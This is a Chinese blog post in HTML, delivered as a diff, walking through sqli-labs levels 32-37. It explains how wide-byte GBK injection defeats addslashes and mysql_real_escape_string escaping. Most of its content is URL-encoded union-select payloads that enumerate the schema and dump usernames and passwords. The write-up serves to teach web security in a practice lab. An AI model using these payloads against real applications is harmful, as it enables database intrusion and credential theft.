@@ -1,0 +1,387 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>sqli-labs靶场(5)宽字节注入 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="sqli-labs靶场(5)宽字节注入" />
+<meta property="og:description" content="sqli-labs靶场精简记录32-37" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/sqli-labs_5_wchar/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-17T00:12:00+08:00" />
+<meta property="article:modified_time" content="2023-11-17T00:12:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="sqli-labs靶场(5)宽字节注入"/>
+<meta name="twitter:description" content="sqli-labs靶场精简记录32-37"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/sqli-labs_5_wchar/" /><link rel="prev" href="http://scofield1920.github.io/sqli-labs_6_stacked/" /><link rel="next" href="http://scofield1920.github.io/sqli-labs_3_post_head/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "sqli-labs靶场(5)宽字节注入",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/sqli-labs_5_wchar\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "web, wp, sqli","wordcount":  280 ,
+        "url": "http:\/\/scofield1920.github.io\/sqli-labs_5_wchar\/","datePublished": "2023-11-17T00:12:00+08:00","dateModified": "2023-11-17T00:12:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-32-bypass-addslashes">Less-32 Bypass addslashes()</a></li>
+        <li><a href="#less-33-bypass-addslashes">Less-33 Bypass addslashes()</a></li>
+        <li><a href="#less-34-bypass-add-slashes">Less-34 Bypass Add SLASHES</a></li>
+        <li><a href="#less-35-why-care-for-addslashes">Less-35 why care for addslashes()</a></li>
+        <li><a href="#less-36-bypass-mysql-real-escape-string">Less-36 Bypass MySQL Real Escape String</a></li>
+        <li><a href="#less-37--mysql_real_escape_string">Less-37- MySQL_real_escape_string</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">sqli-labs靶场(5)宽字节注入</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a>&nbsp;<a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>Wp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;280 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-32-bypass-addslashes">Less-32 Bypass addslashes()</a></li>
+        <li><a href="#less-33-bypass-addslashes">Less-33 Bypass addslashes()</a></li>
+        <li><a href="#less-34-bypass-add-slashes">Less-34 Bypass Add SLASHES</a></li>
+        <li><a href="#less-35-why-care-for-addslashes">Less-35 why care for addslashes()</a></li>
+        <li><a href="#less-36-bypass-mysql-real-escape-string">Less-36 Bypass MySQL Real Escape String</a></li>
+        <li><a href="#less-37--mysql_real_escape_string">Less-37- MySQL_real_escape_string</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>sqli-labs靶场精简记录32-37</p>
+<h3 id="less-32-bypass-addslashes" class="headerLink">
+    <a href="#less-32-bypass-addslashes" class="header-mark"></a>Less-32 Bypass addslashes()</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_addslashes</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="o">.</span> <span class="nx">preg_quote</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">)</span> <span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\\\\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>          <span class="c1">//escape any backslash
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\&#39;/i&#39;</span><span class="p">,</span> <span class="s1">&#39;\\\&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>                               <span class="c1">//escape single quote with a backslash
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\&#34;/&#39;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>                                <span class="c1">//escape double quote with a backslash
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用preg_replace函数将 斜杠，单引号和双引号过滤</p>
+<p><strong>宽字节注入原理</strong></p>
+<p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个 汉字。</p>
+<p>使用<code>%df</code>去除<code>/</code></p>
+<p><code>urlencode(\') = %5c%27</code>，我们在 <code>%5c%27</code> 前面添加 <code>%df</code>，形 成 <code>%df%5c%27</code>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把 <code>%df%5c</code> 当做是一个汉字<code>運</code>，<code>%27</code> 则作为一个单独的符号在外面，此时<code>'</code>就逃逸出来了。</p>
+<p>bypass</p>
+<p>使用<code>%df</code>宽字节注入来消除反斜杠</p>
+<p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">爆库:
+</span></span><span class="line"><span class="cl">-1%df%27 union select 1,2,database()--+
+</span></span><span class="line"><span class="cl">爆表：
+</span></span><span class="line"><span class="cl">-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
+</span></span><span class="line"><span class="cl">或者将security转换为16进制:
+</span></span><span class="line"><span class="cl">-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+
+</span></span><span class="line"><span class="cl">爆字段:
+</span></span><span class="line"><span class="cl">user转换为16进制：0x7573657273
+</span></span><span class="line"><span class="cl">-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+
+</span></span><span class="line"><span class="cl">爆数据:
+</span></span><span class="line"><span class="cl">-1%df%27 union select 1,group_concat(username,0x7e,password),3 from security.users--+
+</span></span><span class="line"><span class="cl">或者
+</span></span><span class="line"><span class="cl">-1%df%27 union select 1,group_concat(username,0x7e,password),3 from users--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-33-bypass-addslashes" class="headerLink">
+    <a href="#less-33-bypass-addslashes" class="header-mark"></a>Less-33 Bypass addslashes()</h3><p>bypass和payload同上题</p>
+<h3 id="less-34-bypass-add-slashes" class="headerLink">
+    <a href="#less-34-bypass-add-slashes" class="header-mark"></a>Less-34 Bypass Add SLASHES</h3><p>基于错误 POST 单引号字符型 addslashes () 宽字节注入</p>
+<p>bypass和payload同上题</p>
+<h3 id="less-35-why-care-for-addslashes" class="headerLink">
+    <a href="#less-35-why-care-for-addslashes" class="header-mark"></a>Less-35 why care for addslashes()</h3><p>基于错误 GET 数字型 addslashes () 宽字节注入</p>
+<p>数字型，注入语句出现的引号里面的数据需要转换为十六进制</p>
+<p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">爆库:
+</span></span><span class="line"><span class="cl">-1 union select 1,2,database()--+
+</span></span><span class="line"><span class="cl">爆表:
+</span></span><span class="line"><span class="cl">-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 --+
+</span></span><span class="line"><span class="cl">爆字段:
+</span></span><span class="line"><span class="cl">-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+
+</span></span><span class="line"><span class="cl">爆数据:
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-36-bypass-mysql-real-escape-string" class="headerLink">
+    <a href="#less-36-bypass-mysql-real-escape-string" class="header-mark"></a>Less-36 Bypass MySQL Real Escape String</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function check_quotes($string)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    $string= mysql_real_escape_string($string);    
+</span></span><span class="line"><span class="cl">    return $string;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql_real_escape_string()函数转义的特殊字符 \x00 \n \r \ &#39; &#34; \x1a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>GBK编码，宽字节注入</p>
+<p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">爆位置:
+</span></span><span class="line"><span class="cl">0%bb%5c%5c%27 union select 1,2,3-- #
+</span></span><span class="line"><span class="cl">爆数据库:
+</span></span><span class="line"><span class="cl">-1%E6&#39; union select 1,2,database()--+
+</span></span><span class="line"><span class="cl">爆表:
+</span></span><span class="line"><span class="cl">-1%E6&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 --+
+</span></span><span class="line"><span class="cl">爆列名:
+</span></span><span class="line"><span class="cl">-1%E6&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+
+</span></span><span class="line"><span class="cl">爆值:
+</span></span><span class="line"><span class="cl">-1%E6&#39; union select 1,group_concat(username,0x7e,password),3 from security.users --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-37--mysql_real_escape_string" class="headerLink">
+    <a href="#less-37--mysql_real_escape_string" class="header-mark"></a>Less-37- MySQL_real_escape_string</h3><p>post请求，payload同上题</p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-11-17</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/sqli-labs_5_wchar/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\sqli-labs_5_wchar.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\sqli-labs_5_wchar.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20sqli-labs%E9%9D%B6%E5%9C%BA%285%29%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5&body=|Field|Value|%0A|-|-|%0A|Title|sqli-labs%E9%9D%B6%E5%9C%BA%285%29%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5|%0A|Url|http://scofield1920.github.io/sqli-labs_5_wchar/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\sqli-labs_5_wchar.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/sqli-labs_5_wchar/" data-title="sqli-labs靶场(5)宽字节注入" data-hashtags="web,wp,sqli"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/sqli-labs_5_wchar/" data-hashtag="web"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/sqli-labs_5_wchar/" data-title="sqli-labs靶场(5)宽字节注入"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/sqli-labs_5_wchar/" data-title="sqli-labs靶场(5)宽字节注入"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/sqli-labs_5_wchar/" data-title="sqli-labs靶场(5)宽字节注入"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/sqli-labs_5_wchar/" data-title="sqli-labs靶场(5)宽字节注入" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;sqli-labs靶场(5)宽字节注入&#34;, &#34;http://scofield1920.github.io/sqli-labs_5_wchar/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/wp/">Wp</a>,&nbsp;<a href="/tags/sqli/">Sqli</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/sqli-labs_6_stacked/" class="prev" rel="prev" title="sqli-labs靶场(6)堆叠注入"><i class="fas fa-angle-left fa-fw"></i>sqli-labs靶场(6)堆叠注入</a>
+            <a href="/sqli-labs_3_post_head/" class="next" rel="next" title="sqli-labs靶场(3)POST头部">sqli-labs靶场(3)POST头部<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
